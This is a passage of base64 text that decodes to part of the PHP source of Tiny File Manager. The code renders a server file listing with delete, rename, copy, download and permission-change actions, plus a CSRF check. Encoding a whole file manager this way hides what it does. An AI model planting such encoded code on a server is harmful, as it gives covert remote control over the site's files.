mlsZXNpemVfcmF3LCAxOCwgIjAiLCBTVFJfUEFEX0xFRlQpOyA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvICRmaWxlc2l6ZTsgPz4NCiAgICAgICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPHRkIGRhdGEtb3JkZXI9ImEtPD9waHAgZWNobyAkZGF0ZV9zb3J0aW5nOyA/PiI+PD9waHAgZWNobyAkbW9kaWYgPz48L3RkPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoIUZNX0lTX1dJTiAmJiAhJGhpZGVfQ29scyk6ID8+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+PGEgdGl0bGU9IkNoYW5nZSBQZXJtaXNzaW9ucyIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2NobW9kPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKSA/PiI+PD9waHAgZWNobyAkcGVybXMgPz48L2E+PD9waHAgZWxzZTogPz48P3BocCBlY2hvICRwZXJtcyA/Pjw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvICRvd25lclsnbmFtZSddIC4gJzonIC4gJGdyb3VwWyduYW1lJ10gPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImlubGluZS1hY3Rpb25zIj48P3BocCBpZiAoIUZNX1JFQURPTkxZKTogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0RlbGV0ZScpID8+IiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7ZGVsPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKSA/PiIgb25jbGljaz0iY29uZmlybURhaWxvZyhldmVudCwgJzEwMjgnLCc8P3BocCBlY2hvIGxuZygnRGVsZXRlJykgLiAnICcgLiBsbmcoJ0ZvbGRlcicpOyA/PicsJzw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKSA/PicsIHRoaXMuaHJlZik7Ij4gPGkgY2xhc3M9ImZhIGZhLXRyYXNoLW8iIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnUmVuYW1lJykgPz4iIGhyZWY9IiMiIG9uY2xpY2s9InJlbmFtZSgnPD9waHAgZWNobyBmbV9lbmMoYWRkc2xhc2hlcyhGTV9QQVRIKSkgPz4nLCAnPD9waHAgZWNobyBmbV9lbmMoYWRkc2xhc2hlcygkZikpID8+Jyk7cmV0dXJuIGZhbHNlOyI+PGkgY2xhc3M9ImZhIGZhLXBlbmNpbC1zcXVhcmUtbyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT48L2E+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdDb3B5VG8nKSA/Pi4uLiIgaHJlZj0iP3A9JmFtcDtjb3B5PTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCAuICcvJyAuICRmLCAnLycpKSA/PiI+PGkgY2xhc3M9ImZhIGZhLWZpbGVzLW8iIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0RpcmVjdExpbmsnKSA/PiIgaHJlZj0iPD9waHAgZWNobyBmbV9lbmMoRk1fUk9PVF9VUkwgLiAoRk1fUEFUSCAhPSAnJyA/ICcvJyAuIEZNX1BBVEggOiAnJykgLiAnLycgLiAkZiAuICcvJykgPz4iIHRhcmdldD0iX2JsYW5rIj48aSBjbGFzcz0iZmEgZmEtbGluayIgYXJpYS1oaWRkZW49InRydWUiPjwvaT48L2E+DQogICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICAgICAgZmx1c2goKTsNCiAgICAgICAgICAgICAgICAkaWkrKzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRpayA9IDgwMDI7DQogICAgICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGYpIHsNCiAgICAgICAgICAgICAgICAkaXNfbGluayA9IGlzX2xpbmsoJHBhdGggLiAnLycgLiAkZik7DQogICAgICAgICAgICAgICAgJGltZyA9ICRpc19saW5rID8gJ2ZhIGZhLWZpbGUtdGV4dC1vJyA6IGZtX2dldF9maWxlX2ljb25fY2xhc3MoJHBhdGggLiAnLycgLiAkZik7DQogICAgICAgICAgICAgICAgJG1vZGlmX3JhdyA9IGZpbGVtdGltZSgkcGF0aCAuICcvJyAuICRmKTsNCiAgICAgICAgICAgICAgICAkbW9kaWYgPSBkYXRlKEZNX0RBVEVUSU1FX0ZPUk1BVCwgJG1vZGlmX3Jhdyk7DQogICAgICAgICAgICAgICAgJGRhdGVfc29ydGluZyA9IHN0cnRvdGltZShkYXRlKCJGIGQgWSBIOmk6cy4iLCAkbW9kaWZfcmF3KSk7DQogICAgICAgICAgICAgICAgJGZpbGVzaXplX3JhdyA9IGZtX2dldF9zaXplKCRwYXRoIC4gJy8nIC4gJGYpOw0KICAgICAgICAgICAgICAgICRmaWxlc2l6ZSA9IGZtX2dldF9maWxlc2l6ZSgkZmlsZXNpemVfcmF3KTsNCiAgICAgICAgICAgICAgICAkZmlsZWxpbmsgPSAnP3A9JyAuIHVybGVuY29kZShGTV9QQVRIKSAuICcmYW1wO3ZpZXc9JyAuIHVybGVuY29kZSgkZik7DQogICAgICAgICAgICAgICAgJGFsbF9maWxlc19zaXplICs9ICRmaWxlc2l6ZV9yYXc7DQogICAgICAgICAgICAgICAgJHBlcm1zID0gc3Vic3RyKGRlY29jdChmaWxlcGVybXMoJHBhdGggLiAnLycgLiAkZikpLCAtNCk7DQogICAgICAgICAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0cHd1aWQnKSAmJiBmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGdyZ2lkJykpIHsNCiAgICAgICAgICAgICAgICAgICAgJG93bmVyID0gcG9zaXhfZ2V0cHd1aWQoZmlsZW93bmVyKCRwYXRoIC4gJy8nIC4gJGYpKTsNCiAgICAgICAgICAgICAgICAgICAgJGdyb3VwID0gcG9zaXhfZ2V0Z3JnaWQoZmlsZWdyb3VwKCRwYXRoIC4gJy8nIC4gJGYpKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRvd25lciA9PT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRvd25lciA9IGFycmF5KCduYW1lJyA9PiAnPycpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGlmICgkZ3JvdXAgPT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZ3JvdXAgPSBhcnJheSgnbmFtZScgPT4gJz8nKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRvd25lciA9IGFycmF5KCduYW1lJyA9PiAnPycpOw0KICAgICAgICAgICAgICAgICAgICAkZ3JvdXAgPSBhcnJheSgnbmFtZScgPT4gJz8nKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICA/Pg0KICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImN1c3RvbS1jaGVja2JveC10ZCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wgY3VzdG9tLWNoZWNrYm94Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtaW5wdXQiIGlkPSI8P3BocCBlY2hvICRpayA/PiIgbmFtZT0iZmlsZVtdIiB2YWx1ZT0iPD9waHAgZWNobyBmbV9lbmMoJGYpID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJjdXN0b20tY29udHJvbC1sYWJlbCIgZm9yPSI8P3BocCBlY2hvICRpayA/PiI+PC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvdGQ+PD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBkYXRhLXNvcnQ9PD9waHAgZWNobyBmbV9lbmMoJGYpID8+Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZmlsZW5hbWUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGluX2FycmF5KHN0cnRvbG93ZXIocGF0aGluZm8oJGYsIFBBVEhJTkZPX0VYVEVOU0lPTikpLCBhcnJheSgnZ2lmJywgJ2pwZycsICdqcGVnJywgJ3BuZycsICdibXAnLCAnaWNvJywgJ3N2ZycsICd3ZWJwJywgJ2F2aWYnKSkpOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAkaW1hZ2VQcmV2aWV3ID0gZm1fZW5jKEZNX1JPT1RfVVJMIC4gKEZNX1BBVEggIT0gJycgPyAnLycgLiBGTV9QQVRIIDogJycpIC4gJy8nIC4gJGYpOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI8P3BocCBlY2hvICRmaWxlbGluayA/PiIgZGF0YS1wcmV2aWV3LWltYWdlPSI8P3BocCBlY2hvICRpbWFnZVByZXZpZXcgPz4iIHRpdGxlPSI8P3BocCBlY2hvIGZtX2VuYygkZikgPz4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbHNlOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iPD9waHAgZWNobyAkZmlsZWxpbmsgPz4iIHRpdGxlPSI8P3BocCBlY2hvICRmID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9Ijw/cGhwIGVjaG8gJGltZyA/PiI+PC9pPiA8P3BocCBlY2hvIGZtX2NvbnZlcnRfd2luKGZtX2VuYygkZikpID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2E+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvICgkaXNfbGluayA/ICcgJnJhcnI7IDxpPicgLiByZWFkbGluaygkcGF0aCAuICcvJyAuICRmKSAuICc8L2k+JyA6ICcnKSA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBkYXRhLW9yZGVyPSJiLTw/cGhwIGVjaG8gc3RyX3BhZCgkZmlsZXNpemVfcmF3LCAxOCwgIjAiLCBTVFJfUEFEX0xFRlQpOyA/PiI+PHNwYW4gdGl0bGU9Ijw/cGhwIHByaW50ZignJXMgYnl0ZXMnLCAkZmlsZXNpemVfcmF3KSA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyAkZmlsZXNpemU7ID8+DQogICAgICAgICAgICAgICAgICAgICAgICA8L3NwYW4+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPHRkIGRhdGEtb3JkZXI9ImItPD9waHAgZWNobyAkZGF0ZV9zb3J0aW5nOyA/PiI+PD9waHAgZWNobyAkbW9kaWYgPz48L3RkPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoIUZNX0lTX1dJTiAmJiAhJGhpZGVfQ29scyk6ID8+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+PGEgdGl0bGU9Ijw/cGhwIGVjaG8gJ0NoYW5nZSBQZXJtaXNzaW9ucycgPz4iIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpID8+JmFtcDtjaG1vZD08P3BocCBlY2hvIHVybGVuY29kZSgkZikgPz4iPjw/cGhwIGVjaG8gJHBlcm1zID8+PC9hPjw/cGhwIGVsc2U6ID8+PD9waHAgZWNobyAkcGVybXMgPz48P3BocCBlbmRpZjsgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PD9waHAgZWNobyBmbV9lbmMoJG93bmVyWyduYW1lJ10gLiAnOicgLiAkZ3JvdXBbJ25hbWUnXSkgPz48L3RkPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4NCiAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJpbmxpbmUtYWN0aW9ucyI+DQogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoIUZNX1JFQURPTkxZKTogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0RlbGV0ZScpID8+IiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7ZGVsPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKSA/PiIgb25jbGljaz0iY29uZmlybURhaWxvZyhldmVudCwgMTIwOSwgJzw/cGhwIGVjaG8gbG5nKCdEZWxldGUnKSAuICcgJyAuIGxuZygnRmlsZScpOyA/PicsJzw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKTsgPz4nLCB0aGlzLmhyZWYpOyI+IDxpIGNsYXNzPSJmYSBmYS10cmFzaC1vIj48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnUmVuYW1lJykgPz4iIGhyZWY9IiMiIG9uY2xpY2s9InJlbmFtZSgnPD9waHAgZWNobyBmbV9lbmMoYWRkc2xhc2hlcyhGTV9QQVRIKSkgPz4nLCAnPD9waHAgZWNobyBmbV9lbmMoYWRkc2xhc2hlcygkZikpID8+Jyk7cmV0dXJuIGZhbHNlOyI+PGkgY2xhc3M9ImZhIGZhLXBlbmNpbC1zcXVhcmUtbyI+PC9pPjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0NvcHlUbycpID8+Li4uIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7Y29weT08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEggLiAnLycgLiAkZiwgJy8nKSkgPz4iPjxpIGNsYXNzPSJmYSBmYS1maWxlcy1vIj48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0RpcmVjdExpbmsnKSA/PiIgaHJlZj0iPD9waHAgZWNobyBmbV9lbmMoRk1fUk9PVF9VUkwgLiAoRk1fUEFUSCAhPSAnJyA/ICcvJyAuIEZNX1BBVEggOiAnJykgLiAnLycgLiAkZikgPz4iIHRhcmdldD0iX2JsYW5rIj48aSBjbGFzcz0iZmEgZmEtbGluayI+PC9pPjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnRG93bmxvYWQnKSA/PiIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2RsPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKSA/PiIgb25jbGljaz0iY29uZmlybURhaWxvZyhldmVudCwgMTIxMSwgJzw/cGhwIGVjaG8gbG5nKCdEb3dubG9hZCcpOyA/PicsJzw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKTsgPz4nLCB0aGlzLmhyZWYpOyI+PGkgY2xhc3M9ImZhIGZhLWRvd25sb2FkIj48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgICAgIGZsdXNoKCk7DQogICAgICAgICAgICAgICAgJGlrKys7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmIChlbXB0eSgkZm9sZGVycykgJiYgZW1wdHkoJGZpbGVzKSkgeyA/Pg0KICAgICAgICAgICAgICAgIDx0Zm9vdD4NCiAgICAgICAgICAgICAgICAgICAgPHRyPjw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48L3RkPjw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49Ijw/cGhwIGVjaG8gKCFGTV9JU19XSU4gJiYgISRoaWRlX0NvbHMpID8gJzYnIDogJzQnID8+Ij48ZW0+PD9waHAgZWNobyBsbmcoJ0ZvbGRlciBpcyBlbXB0eScpID8+PC9lbT48L3RkPg0KICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgIDwvdGZvb3Q+DQogICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgfSBlbHNlIHsgPz4NCiAgICAgICAgICAgICAgICA8dGZvb3Q+DQogICAgICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZ3JheSBmcy03IiBjb2xzcGFuPSI8P3BocCBlY2hvICghRk1fSVNfV0lOICYmICEkaGlkZV9Db2xzKSA/IChGTV9SRUFET05MWSA/ICc2JyA6ICc3JykgOiAoRk1fUkVBRE9OTFkgPyAnNCcgOiAnNScpID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvIGxuZygnRnVsbFNpemUnKSAuICc6IDxzcGFuIGNsYXNzPSJiYWRnZSB0ZXh0LWJnLWxpZ2h0IGJvcmRlci1yYWRpdXMtMCI+JyAuIGZtX2dldF9maWxlc2l6ZSgkYWxsX2ZpbGVzX3NpemUpIC4gJzwvc3Bhbj4nID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyBsbmcoJ0ZpbGUnKSAuICc6IDxzcGFuIGNsYXNzPSJiYWRnZSB0ZXh0LWJnLWxpZ2h0IGJvcmRlci1yYWRpdXMtMCI+JyAuICRudW1fZmlsZXMgLiAnPC9zcGFuPicgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvIGxuZygnRm9sZGVyJykgLiAnOiA8c3BhbiBjbGFzcz0iYmFkZ2UgdGV4dC1iZy1saWdodCBib3JkZXItcmFkaXVzLTAiPicgLiAkbnVtX2ZvbGRlcnMgLiAnPC9zcGFuPicgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAgICAgICAgPC90Zm9vdD4NCiAgICAgICAgICAgIDw/cGhwIH0gPz4NCiAgICAgICAgPC90YWJsZT4NCiAgICA8L2Rpdj4NCg0KICAgIDxkaXYgY2xhc3M9InJvdyI+DQogICAgICAgIDw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbC1zbS05Ij4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJidG4tZ3JvdXAgZmxleC13cmFwIiBkYXRhLXRvZ2dsZT0iYnV0dG9ucyIgcm9sZT0idG9vbGJhciI+DQogICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9IiMvc2VsZWN0LWFsbCIgY2xhc3M9ImJ0biBidG4tc21hbGwgYnRuLW91dGxpbmUtcHJpbWFyeSBidG4tMiIgb25jbGljaz0ic2VsZWN0X2FsbCgpO3JldHVybiBmYWxzZTsiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1zcXVhcmUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1NlbGVjdEFsbCcpID8+IDwvYT4NCiAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iIy91bnNlbGVjdC1hbGwiIGNsYXNzPSJidG4gYnRuLXNtYWxsIGJ0bi1vdXRsaW5lLXByaW1hcnkgYnRuLTIiIG9uY2xpY2s9InVuc2VsZWN0X2FsbCgpO3JldHVybiBmYWxzZTsiPjxpIGNsYXNzPSJmYSBmYS13aW5kb3ctY2xvc2UiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1VuU2VsZWN0QWxsJykgPz4gPC9hPg0KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIjL2ludmVydC1hbGwiIGNsYXNzPSJidG4gYnRuLXNtYWxsIGJ0bi1vdXRsaW5lLXByaW1hcnkgYnRuLTIiIG9uY2xpY2s9ImludmVydF9hbGwoKTtyZXR1cm4gZmFsc2U7Ij48aSBjbGFzcz0iZmEgZmEtdGgtbGlzdCI+PC9pPiA8P3BocCBlY2hvIGxuZygnSW52ZXJ0U2VsZWN0aW9uJykgPz4gPC9hPg0KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iaGlkZGVuIiBuYW1lPSJkZWxldGUiIGlkPSJhLWRlbGV0ZSIgdmFsdWU9IkRlbGV0ZSIgb25jbGljaz0icmV0dXJuIGNvbmZpcm0oJzw/cGhwIGVjaG8gbG5nKCdEZWxldGUgc2VsZWN0ZWQgZmlsZXMgYW5kIGZvbGRlcnM/Jyk7ID8+JykiPg0KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLWRlbGV0ZScpLmNsaWNrKCk7IiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIj48aSBjbGFzcz0iZmEgZmEtdHJhc2giPjwvaT4gPD9waHAgZWNobyBsbmcoJ0RlbGV0ZScpID8+IDwvYT4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImhpZGRlbiIgbmFtZT0iemlwIiBpZD0iYS16aXAiIHZhbHVlPSJ6aXAiIG9uY2xpY2s9InJldHVybiBjb25maXJtKCc8P3BocCBlY2hvIGxuZygnQ3JlYXRlIGFyY2hpdmU/Jyk7ID8+JykiPg0KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLXppcCcpLmNsaWNrKCk7IiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIj48aSBjbGFzcz0iZmEgZmEtZmlsZS1hcmNoaXZlLW8iPjwvaT4gPD9waHAgZWNobyBsbmcoJ1ppcCcpID8+IDwvYT4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImhpZGRlbiIgbmFtZT0idGFyIiBpZD0iYS10YXIiIHZhbHVlPSJ0YXIiIG9uY2xpY2s9InJldHVybiBjb25maXJtKCc8P3BocCBlY2hvIGxuZygnQ3JlYXRlIGFyY2hpdmU/Jyk7ID8+JykiPg0KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLXRhcicpLmNsaWNrKCk7IiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIj48aSBjbGFzcz0iZmEgZmEtZmlsZS1hcmNoaXZlLW8iPjwvaT4gPD9waHAgZWNobyBsbmcoJ1RhcicpID8+IDwvYT4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImhpZGRlbiIgbmFtZT0iY29weSIgaWQ9ImEtY29weSIgdmFsdWU9IkNvcHkiPg0KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLWNvcHknKS5jbGljaygpOyIgY2xhc3M9ImJ0biBidG4tc21hbGwgYnRuLW91dGxpbmUtcHJpbWFyeSBidG4tMiI+PGkgY2xhc3M9ImZhIGZhLWZpbGVzLW8iPjwvaT4gPD9waHAgZWNobyBsbmcoJ0NvcHknKSA/PiA8L2E+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC0zIGQtbm9uZSBkLXNtLWJsb2NrIj48YSBocmVmPSJodHRwczovL3RpbnlmaWxlbWFuYWdlci5naXRodWIuaW8iIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0iZmxvYXQtcmlnaHQgdGV4dC1tdXRlZCI+VGlueSBGaWxlIE1hbmFnZXIgPD9waHAgZWNobyBWRVJTSU9OOyA/PjwvYT48L2Rpdj4NCiAgICAgICAgPD9waHAgZWxzZTogPz4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC0xMiI+PGEgaHJlZj0iaHR0cHM6Ly90aW55ZmlsZW1hbmFnZXIuZ2l0aHViLmlvIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImZsb2F0LXJpZ2h0IHRleHQtbXV0ZWQiPlRpbnkgRmlsZSBNYW5hZ2VyIDw/cGhwIGVjaG8gVkVSU0lPTjsgPz48L2E+PC9kaXY+DQogICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgIDwvZGl2Pg0KPC9mb3JtPg0KDQo8P3BocA0KZm1fc2hvd19mb290ZXIoKTsNCg0KLy8gLS0tIEVORCBIVE1MIC0tLQ0KDQovLyBGdW5jdGlvbnMNCg0KLyoqDQogKiBJdCBwcmludHMgdGhlIGNzcy9qcyBmaWxlcyBpbnRvIGh0bWwNCiAqIEBwYXJhbSBrZXkgVGhlIGtleSBvZiB0aGUgZXh0ZXJuYWwgZmlsZSB0byBwcmludC4NCiAqLw0KZnVuY3Rpb24gcHJpbnRfZXh0ZXJuYWwoJGtleSkNCnsNCiAgICBnbG9iYWwgJGV4dGVybmFsOw0KDQogICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKCRrZXksICRleHRlcm5hbCkpIHsNCiAgICAgICAgLy8gdGhyb3cgbmV3IEV4Y2VwdGlvbignS2V5IG1pc3NpbmcgaW4gZXh0ZXJuYWw6ICcgLiBrZXkpOw0KICAgICAgICBlY2hvICI8IS0tIEVYVEVSTkFMOiBNSVNTSU5HIEtFWSAka2V5IC0tPiI7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBlY2hvICIkZXh0ZXJuYWxbJGtleV0iOw0KfQ0KDQovKioNCiAqIFZlcmlmeSBDU1JGIFRPS0VOIGFuZCByZW1vdmUgYWZ0ZXIgY2VydGlmaWVkDQogKiBAcGFyYW0gc3RyaW5nICR0b2tlbg0KICogQHJldHVybiBib29sDQogKi8NCmZ1bmN0aW9uIHZlcmlmeVRva2VuKCR0b2tlbikNCnsNCiAgICBpZiAoaGFzaF9lcXVhbHMoJF9TRVNTSU9OWyd0b2tlbiddLCAkdG9rZW4pKSB7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICByZXR1cm4gZmFsc2U7DQp9DQoNCi8qKg0KICogRGVsZXRlICBmaWxlIG9yIGZvbGRlciAocmVjdXJzaXZlbHkpDQogKiBAcGFyYW0gc3RyaW5nICRwYXRoDQogKiBAcmV0dXJuIGJvb2wNCiAqLw0KZnVuY3Rpb24gZm1fcmRlbGV0ZSgkcGF0aCkNCnsNCiAgICBpZiAoaXNfbGluaygkcGF0aCkpIHsNCiAgICAgICAgcmV0dXJuIHVubGluaygkcGF0aCk7DQogICAgfSBlbHNlaWYgKGlzX2RpcigkcGF0aCkpIHsNCiAgICAgICAgJG9iamVjdHMgPSBzY2FuZGlyKCRwYXRoKTsNCiAgICAgICAg